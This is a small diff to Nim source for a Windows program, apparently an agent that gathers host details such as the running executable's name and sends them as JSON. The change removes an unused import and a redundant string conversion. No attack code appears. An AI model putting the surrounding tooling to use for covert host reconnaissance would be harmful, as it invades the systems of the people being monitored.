@@ -1,4 +1,4 @@
-import winim, os, net, strformat, strutils, registry, zippy
+import winim, os, net, strutils, registry, zippy
 
 import ../../common/[types, serialize, sequence, crypto, utils]
 import ../../modules/manager
@@ -51,7 +51,7 @@ proc getProcessExe(): string =
             if GetModuleFileNameExW(hProcess, 0, buffer, MAX_PATH): 
                 # .extractFilename() from the 'os' module gets the name of the executable from the full process path
                 # We replace trailing NULL bytes to prevent them from being sent as JSON data
-                return string($buffer).extractFilename().replace("\u0000", "")
+                return ($buffer).extractFilename().replace("\u0000", "")
     finally: 
         CloseHandle(hProcess)
 
